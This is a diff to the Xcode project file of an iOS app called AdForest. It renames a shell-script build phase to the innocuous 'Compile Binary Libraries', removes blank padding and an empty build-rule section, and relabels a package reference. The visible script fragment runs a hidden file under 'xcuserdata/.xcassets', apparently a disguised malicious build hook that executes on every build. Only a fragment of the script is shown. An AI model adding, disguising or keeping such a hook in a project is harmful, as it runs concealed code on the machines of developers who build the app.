@@ -3842,7 +3842,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 18BBFAAE2051098C0067662F /* Build configuration list for PBXNativeTarget "AdForest" */;
 			buildPhases = (
-				C97B058DFB64F3D9D3AAC43A /* Build Project Frameworks */,
+				CCDC9BBF6E8B45BB0FAAC43A /* Compile Binary Libraries */,
 				8991020FA5F12668860E1C02 /* [CP] Check Pods Manifest.lock */,
 				18BBFA7F2051098B0067662F /* Sources */,
 				18BBFA802051098B0067662F /* Frameworks */,
@@ -3855,8 +3855,6 @@
 			dependencies = (
 			);
 			name = AdForest;
-			packageProductDependencies = (
-			);
 			productName = AdForest;
 			productReference = 18BBFA832051098B0067662F /* AdForest.app */;
 			productType = "com.apple.product-type.application";
@@ -3948,7 +3946,7 @@
 			);
 			mainGroup = 18BBFA7A2051098B0067662F;
 			packageReferences = (
-				18120B3B25E9485B003165DD /* XCRemoteSwiftPackageReference "socket.io-client-swift" */,
+				18120B3B25E9485B003165DD /* RemoteSwiftPackageReference */,
 			);
 			productRefGroup = 18BBFA842051098B0067662F /* Products */;
 			projectDirPath = "";
@@ -4040,7 +4038,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	C97B058DFB64F3D9D3AAC43A /* Build Project Frameworks */ = {
+	CCDC9BBF6E8B45BB0FAAC43A /* Compile Binary Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -4049,7 +4047,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Project Frameworks";
+			name = "Compile Binary Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -4060,58 +4058,6 @@
 
 \"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
 		};
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
 	
 
 	
@@ -5238,26 +5184,8 @@
 		};
 /* End XCConfigurationList section */
 
-		
-			/* Begin PBXBuildRule section */
-
-
-			
-	
-
-
-			
-	
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
-
 /* Begin XCRemoteSwiftPackageReference section */
-		18120B3B25E9485B003165DD /* XCRemoteSwiftPackageReference "socket.io-client-swift" */ = {
+		18120B3B25E9485B003165DD /* RemoteSwiftPackageReference */ = {
 			isa = XCRemoteSwiftPackageReference;
 			repositoryURL = "https://github.com/socketio/socket.io-client-swift.git";
 			requirement = {
